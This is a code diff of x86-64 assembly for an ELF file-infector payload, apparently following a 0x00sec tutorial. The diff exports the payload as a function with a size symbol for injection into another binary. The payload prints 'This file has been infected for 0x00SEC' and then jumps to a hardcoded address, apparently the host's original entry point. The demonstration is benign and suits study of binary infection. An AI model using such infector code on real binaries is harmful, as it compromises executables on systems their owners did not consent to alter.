@@ -19,17 +19,21 @@
 ;
 ;  https://0x00sec.org/t/elfun-file-injector/410:
 
-section .text
-        global _start
+global lafonction:function
+global lasize:data
 
-_start:
+segment .text
+    lasize dd end - lafonction
+
+
+lafonction:
         mov rax,1       ; [1] - sys_write
         mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
         lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
         mov rdx, msg_end - msg      ; msg size
         syscall         ; calls the function stored in rax
 
-	mov rax, 0x11111111
+	mov rax, 0x1050
 	jmp rax
 
         mov rax,60      ; [60] - sys_exit
@@ -39,3 +43,4 @@ _start:
 align 8
         msg     db 'This file has been infected for 0x00SEC',0x0a,0
 	msg_end db 0x0
+end:
